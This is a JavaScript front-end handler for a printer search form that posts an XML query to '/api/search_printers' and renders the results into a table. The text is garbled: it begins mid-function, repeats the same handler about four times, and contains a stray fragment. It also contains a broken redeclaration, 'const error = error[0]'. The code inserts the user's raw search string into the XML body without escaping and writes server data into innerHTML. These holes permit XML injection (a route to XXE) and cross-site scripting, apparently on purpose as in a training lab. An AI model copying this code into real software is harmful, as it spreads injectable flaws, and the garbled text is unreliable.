    e.preventDefault();

    const search_str = document.getElementById('query-name').value;
    const search_country = document.getElementById('query-country').value;
    let country;
    switch (search_country) {
        case 'USA': country = "US"; break;
        case 'Canada': country = "CA"; break;
        case 'Finland': country = "FI"; break;
        case 'Australia': country = "AU"; break;
    }

    const submit = `
    <query>
        <search>${search_str}</search>
        <country>${country}</country>
    </query>
    `;

    fetch("/api/search_printers", {
        method: "POST",
        body: submit
    })
        .then(data => data.text())
        .then(str => new window.DOMParser().parseFromString(str, "text/xml"))
        .then(data => {
            const tableBody = document.getElementById("table-body");
            while (tableBody.firstChild) {
                tableBody.firstChild.remove()
            }

            const error = data.getElementsByTagName("error");

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}

function onSubmit(e) {
    e.preventDefault();

    const search_str = document.getElementById('query-name').value;
    const search_country = document.getElementById('query-country').value;
    let country;
    switch (search_country) {
        case 'USA': country = "US"; break;
        case 'Canada': country = "CA"; break;
        case 'Finland': country = "FI"; break;
        case 'Australia': country = "AU"; break;
    }

    const submit = `
    <query>
        <search>${search_str}</search>
        <country>${country}</country>
    </query>
    `;

    fetch("/api/search_printers", {
        method: "POST",
        body: submit
    })
        .then(data => data.text())
        .then(str => new window.DOMParser().parseFromString(str, "text/xml"))
        .then(data => {
            const tableBody = document.getElementById("table-body");
            while (tableBody.firstChild) {
                tableBody.firstChild.remove()
            }

            const error = data.getElementsByTagName("error");

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}

function onSubmit(e) {
    e.preventDefault();

    const search_str = document.getElementById('query-name').value;
    const search_country = document.getElementById('query-country').value;
    let country;
    switch (search_country) {
        case 'USA': country = "US"; break;
        case 'Canada': country = "CA"; break;
        case 'Finland': country = "FI"; break;
        case 'Australia': country = "AU"; break;
    }

    const submit = `
    <query>
        <search>${search_str}</search>
        <country>${country}</country>
    </query>
    `;

    fetch("/api/search_printers", {
        method: "POST",
        body: submit
    })
        .then(data => data.text())
        .then(str => new window.DOMParser().parseFromString(str, "text/xml"))
        .then(data => {
            const tableBody = document.getElementById("table-body");
            while (tableBody.firstChild) {
                tableBody.firstChild.remove()
            }

            const error = data.getElementsByTagName("error");

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}

function onSubmit(e) {
    e.preventDefault();

    const search_str = document.getElementById('query-name').value;
    const search_country = document.getElementById('query-country').value;
    let country;
    switch (search_country) {
        case 'USA': country = "US"; break;
        case 'Canada': country = "CA"; break;
        case 'Finland': country = "FI"; break;
        case 'Australia': country = "AU"; break;
    }

    const submit = `
    <query>
        <search>${search_str}</search>
        <country>${country}</country>
    </query>
    `;

    fetch("/api/search_printers", {
        method: "POST",
        body: submit
    })
        .then(data => data.text())
        .then(str => new window.DOMParser().parseFromString(str, "text/xml"))
        .then(data => {
            const tableBody = document.getElementById("table-body");
            while (tableBody.firstChild) {
                tableBody.firstChild.remove()
            }

            const error = data.getElementsByTagName("error");

            if (error.length > 0) {
                const error = error[0];
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = error;
                return;
            }

            const prods = data.getElementsByTagName("product");

            if (prods.length == 0) {
                const row = tableBody.insertRow(-1);
                const cell = row.insertCell(-1);
                cell.setAttribute("colspan", "3");
                cell.innerHTML = "No results found.";
            }

            for (p of prods) {
                const row = tableBody.insertRow(-1);
                row.insertCell(-1).innerHTML = p.getAttribute("id");
                row.insertCell(-1).innerHTML = p.getAttribute("name");
                row.insertCell(-1).innerHTML = p.getAttribute("price");
            }
        });

}
